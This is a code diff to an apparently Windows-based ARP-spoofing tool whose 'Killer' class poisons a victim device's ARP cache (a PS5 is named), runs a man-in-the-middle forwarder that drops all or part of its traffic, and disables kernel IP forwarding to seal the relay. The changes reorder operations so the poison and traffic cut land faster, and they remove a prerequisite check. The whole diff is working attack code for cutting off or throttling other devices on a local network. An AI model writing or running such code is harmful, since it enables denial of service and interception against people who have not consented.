@@ -212,13 +212,9 @@ def _set_windows_ip_forwarding(
     if not sys.platform.startswith('win'):
         return
     want = 1 if enabled else 0
-    # Always flip the cheap registry bit immediately.
+    # Cheap registry flip only on the caller thread — never stall Kill on netsh.
     _set_ip_enable_router_registry(want)
     prio = str(priority_iface or '').strip() or None
-    # Critical for full Kill: disable forwarding on the MITM NIC before poison,
-    # without waiting for every other adapter.
-    if prio and not enabled:
-        _netsh_set_iface_forwarding(prio, False)
 
     with _forwarding_lock:
         already = _forwarding_desired is enabled
@@ -232,7 +228,7 @@ def _set_windows_ip_forwarding(
             # Same target already requested — Kill must not wait on netsh again.
             return
         elif worker_alive:
-            # Worker will re-read `_forwarding_desired` and apply the new target.
+            # Worker will re-read `_forwarding_desired` / priority iface.
             return
         else:
             thr = threading.Thread(
@@ -291,10 +287,9 @@ def enable_ip_forwarding(*, blocking: bool = False, priority_iface: str | None =
 def disable_ip_forwarding(*, blocking: bool = False, priority_iface: str | None = None):
     """Disable kernel IP forwarding so MITM forwarder is the only relay path.
 
-    Non-blocking by default so Kill/Lag stay instant; startup should pass
-    ``blocking=True``. Pass ``priority_iface`` (e.g. ``Wi-Fi``) so Kill flips the
-    active MITM NIC synchronously — otherwise kernel relay can lag the PS5 without
-    a full offline / red-chain cut.
+    Non-blocking by default (registry sync + background netsh). Call **after**
+    instant poison/cut on Kill — never before. Startup may pass ``blocking=True``.
+    ``priority_iface`` (e.g. ``Wi-Fi``) is applied first in the background worker.
     """
     _set_windows_ip_forwarding(False, blocking=blocking, priority_iface=priority_iface)
 
@@ -584,24 +579,20 @@ class Killer:
         """
         self._sync_iface_for_victim(victim, refresh_router=not ics_mode)
         self._refresh_victim_mac_from_cache(victim)
-        if not ics_mode:
-            disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
         mac = victim['mac']
         # Reassert path: even if already marked killed, refresh victim record and restart
         # ARP worker generation so ON state recovers from stale/desynced workers.
         seq = self._next_op_seq(mac)
         self.killed[mac] = victim
         self._stop_forwarder(mac)
-        # Symmetric immediate burst on the caller thread so Kill ON cuts the victim as
-        # fast as Kill OFF restores it. Before this, the worker thread sent one packet
-        # then slept ``wait_after`` (2 s) — if the victim missed that first poison
-        # (switch buffering / NIC offload / packet loss), the next attempt was 2 s
-        # later, manifesting as a "delayed Kill ON, instant Kill OFF" asymmetry.
-        # unkill() mirrors this with _restore_arp_now(repeats=3) — keep them paired.
+        # Instant path first: poison + cut. Forwarding disable / probes come after.
         self._poison_arp_now(victim, seq, repeats=3, delay_s=0)
         self._kill_arp_worker(victim, wait_after, seq)
         if not ics_mode and traffic_cut:
             self._apply_traffic_cut_sync(victim)
+        if not ics_mode:
+            # After cut is armed — seal kernel relay without delaying the first hit.
+            disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
 
     def _apply_traffic_cut_sync(self, victim):
         """Start 100% drop forwarder on the caller thread (Kill must not miss re-arm)."""
@@ -610,8 +601,10 @@ class Killer:
         mac = victim.get('mac')
         if not mac or mac not in self.killed:
             return False
-        ok, _reason = self.mitm_prereqs_ok(victim)
-        if not ok:
+        # Hot path: GUI already validated live MITM; do not re-ping here.
+        if not mac_address_is_usable((self.router or {}).get('mac')):
+            return False
+        if not mac_address_is_usable(victim.get('mac')):
             return False
         self.apply_percent_cut(victim, pass_percent=0)
         fw = self.forwarders.get(mac)
@@ -791,7 +784,6 @@ class Killer:
         if not tokens:
             return False
         self._get_socket()
-        disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
         # Full Kill (0%): hard-drop both directions in addition to pass ratio.
         hard_drop = pass_percent <= 0
         fw = MitmForwarder(debug=debug)
@@ -809,7 +801,10 @@ class Killer:
         self.forwarders[mac] = fw
         if not (fw and getattr(fw, 'running', False)):
             self.forwarders.pop(mac, None)
-        return bool(fw and getattr(fw, 'running', False))
+            return False
+        # Seal kernel relay after the forwarder is live — never before the cut.
+        disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
+        return True
 
     def disable_percent_cut(self, mac):
         self._stop_forwarder(mac)
@@ -869,7 +864,6 @@ class Killer:
         if not tokens:
             return
         self._get_socket()
-        disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
         fw = MitmForwarder(debug=debug)
         fw.start(
             victim=victim,
@@ -891,6 +885,7 @@ class Killer:
             iface_alts=tokens[1:],
         )
         self.forwarders[victim['mac']] = fw
+        disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
 
     @threaded
     def _kill_arp_worker(self, victim, wait_after=2, seq=0):
